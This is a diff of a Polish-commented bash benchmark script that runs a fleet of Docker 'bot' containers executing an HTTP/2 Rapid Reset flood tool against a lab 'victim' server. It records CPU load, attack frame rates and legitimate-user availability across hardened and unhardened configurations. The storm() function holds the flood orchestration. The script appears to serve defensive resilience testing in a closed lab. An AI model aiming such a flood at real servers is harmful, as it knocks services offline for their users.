@@ -65,8 +65,9 @@ storm(){ local n=$1 dur=$2 b
     docker exec -d lab-bot$b sh -c 'rm -f /tmp/rr.log; end=$(( $(date +%s)+'"$dur"' )); while [ $(date +%s) -lt $end ]; do rapidreset -url https://victim:443 -requests '"$REQ"' -concurrency '"$CONC"' >> /tmp/rr.log 2>&1; done' 2>/dev/null
   done; }
 stopb(){ local n=$1 b; for b in $(seq 1 $n); do docker exec lab-bot$b pkill rapidreset 2>/dev/null; done; }
-# zsumuj RST_STREAM (lub HEADERS) ze wszystkich rund bota: pole "KEY=NNN"
-botsum(){ local b=$1 key=$2; timeout 6 docker exec lab-bot$b sh -c "awk -F'$key=' 'NF>1{split(\$2,a,\" \"); s+=a[1]} END{print s+0}' /tmp/rr.log 2>/dev/null"; }
+# zsumuj RST_STREAM (lub HEADERS) ze wszystkich rund bota.
+# Format podsumowania rapidreset: "Frames sent: HEADERS = 1575, RST_STREAM = 19671"
+botsum(){ local b=$1 key=$2; timeout 6 docker exec lab-bot$b sh -c "awk -F'$key = ' 'NF>1{n=\$2; gsub(/[^0-9].*/,\"\",n); s+=n} END{print s+0}' /tmp/rr.log 2>/dev/null"; }
 
 # --- 0. sanity: sieć istnieje? ---
 docker network inspect "$NETWORK" >/dev/null 2>&1 || { echo "BŁĄD: brak sieci $NETWORK — uruchom najpierw: docker compose up -d --build"; exit 1; }
@@ -84,7 +85,8 @@ for i in $(seq 1 $NMAX); do
 done
 
 # CSV: pełny obraz "ile botów trzeba"
-echo "config,ver,hard,size,cpu_pct,active,atk_rst_s,atk_hdr_s,legit_rps,legit_2xx,legit_fail,legit_ok_pct" > "$CSV"
+# legit_ok/legit_tot = ile z 12 sekwencyjnych zadan legalnego usera sie udalo; legit_avg_s = sr. latencja [s]
+echo "config,ver,hard,size,cpu_pct,active,atk_rst_s,atk_hdr_s,legit_ok,legit_tot,legit_avg_s,legit_ok_pct" > "$CSV"
 
 run_config(){ # ver mode
   local VER=$1 MODE=$2 IMG="labvic:$1" N w u0 u1 t0 t1 cw sum k acc cpu i b
@@ -93,13 +95,21 @@ run_config(){ # ver mode
   log "=== CONFIG $VER/$MODE ==="
   i=0; while [ $i -lt 20 ]; do timeout 4 docker exec "$LOADGEN" sh -c 'curl -sk --max-time 3 https://victim/status >/dev/null 2>&1' && break; i=$((i+1)); sleep 1; done
 
-  # baseline legalnego klienta BEZ ataku (żeby było z czym porównać "ok_pct")
-  docker exec "$LOADGEN" sh -c "h2load -c 2 -m 10 --duration=4 https://victim:443/ 2>/dev/null | awk '/finished in/{print \$3} /status codes/{print}'" >/dev/null 2>&1
-
   for N in $SIZES; do
     storm $N $DUR; sleep $WARM
-    # sonda legalnego klienta startuje RÓWNOLEGLE z atakiem, na całe okno pomiaru
-    docker exec -d "$LOADGEN" sh -c "h2load -c 2 -m 10 --duration=$LEGWIN https://victim:443/ > /tmp/legit.out 2>&1"
+    # sonda legalnego usera: 12 sekwencyjnych zadan co ~1s, RÓWNOLEGLE z atakiem.
+    # Lagodna (1 req/s) -> NIE wpada w rate-limiter; mierzy wplyw ATAKU: dostepnosc + latencje.
+    docker exec -d "$LOADGEN" sh -c '
+      : > /tmp/legit_lat; ok=0; tot=0
+      for i in $(seq 1 12); do
+        r=$(curl -sk -o /dev/null -w "%{http_code} %{time_total}" --max-time 5 https://victim/ 2>/dev/null)
+        tot=$((tot+1)); set -- $r; code=$1; lat=$2; echo "$lat" >> /tmp/legit_lat
+        case "$code" in 2*) ok=$((ok+1));; esac
+        sleep 1
+      done
+      avg=$(awk "{s+=\$1;n++} END{if(n>0)printf \"%.3f\",s/n; else print 0}" /tmp/legit_lat)
+      echo "ok=$ok tot=$tot avg=$avg" > /tmp/legit.out
+    '
     # pomiar CPU w NWIN oknach
     sum=0; k=0; acc=0
     for w in $(seq 1 $NWIN); do
@@ -120,17 +130,15 @@ run_config(){ # ver mode
     rst_s=$(awk "BEGIN{printf \"%.0f\", $trst/$DUR}")
     hdr_s=$(awk "BEGIN{printf \"%.0f\", $thdr/$DUR}")
 
-    # [C] dostępność dla legalnego usera (podczas ataku)
+    # [C] dostępność + latencja legalnego usera (podczas ataku)
     LG=$(timeout 6 docker exec "$LOADGEN" sh -c 'cat /tmp/legit.out 2>/dev/null')
-    lrps=$(echo "$LG" | awk -F'[, ]+' '/finished in/{for(i=1;i<=NF;i++) if($i=="req/s,"||$i=="req/s") print $(i-1)}' | head -1)
-    l2xx=$(echo "$LG" | awk -F'[ ,]+' '/status codes/{print $3}')
-    ltot=$(echo "$LG" | awk -F'[ ,]+' '/requests:/{print $2}')
-    lok=$(echo "$LG"  | awk -F'[ ,]+' '/requests:/{for(i=1;i<=NF;i++) if($i=="succeeded") print $(i-1)}')
-    lfail=$(echo "$LG"| awk -F'[ ,]+' '/requests:/{for(i=1;i<=NF;i++) if($i=="failed") print $(i-1)}')
+    lok=$(echo "$LG"  | sed -n 's/.*ok=\([0-9]*\).*/\1/p')
+    ltot=$(echo "$LG" | sed -n 's/.*tot=\([0-9]*\).*/\1/p')
+    lavg=$(echo "$LG" | sed -n 's/.*avg=\([0-9.]*\).*/\1/p')
     okpct=$(awk "BEGIN{if(\"$ltot\"+0>0) printf \"%.0f\",(\"$lok\"+0)/(\"$ltot\"+0)*100; else print \"NA\"}")
 
-    echo "$VER/$MODE,$VER,$MODE,$N,$cpu,${acc:-0},$rst_s,$hdr_s,${lrps:-0},${l2xx:-0},${lfail:-0},$okpct" >> "$CSV"
-    log "size=$N -> CPU=${cpu}% active=${acc:-0} | atak: ${rst_s} RST/s, ${hdr_s} HEADERS/s | legalny user: ${lrps:-0} req/s, ${okpct}% OK (${lfail:-0} błędów)"
+    echo "$VER/$MODE,$VER,$MODE,$N,$cpu,${acc:-0},$rst_s,$hdr_s,${lok:-0},${ltot:-0},${lavg:-0},$okpct" >> "$CSV"
+    log "size=$N -> CPU=${cpu}% active=${acc:-0} | atak: ${rst_s} RST/s, ${hdr_s} HEADERS/s | legalny user: ${lok:-0}/${ltot:-0} OK (${okpct}%), avg ${lavg:-0}s"
     sleep $GAP
   done
 }
@@ -143,7 +151,7 @@ run_config new hardened
 log "MATRYCA GOTOWA -> $CSV"
 echo; echo "=== WYNIK: ile botów trzeba (CPU ofiary / siła ataku / dostępność usera) ==="
 awk -F, 'NR==1{next}
-  {printf "%-14s size=%-3s  CPU=%5s%%  atak=%9s RST/s  user=%6s req/s  OK=%4s%%\n",$1,$4,$5,$7,$9,$12}' "$CSV"
+  {printf "%-14s size=%-3s  CPU=%6s%%  atak=%11s RST/s  user=%2s/%2s OK (%3s%%)  avg=%5ss\n",$1,$4,$5,$7,$9,$10,$12,$11}' "$CSV"
 
 # sprzątanie floty/ofiary (zostaw bazowy lab)
 for i in $(seq 1 $NMAX); do docker rm -f lab-bot$i >/dev/null 2>&1; done
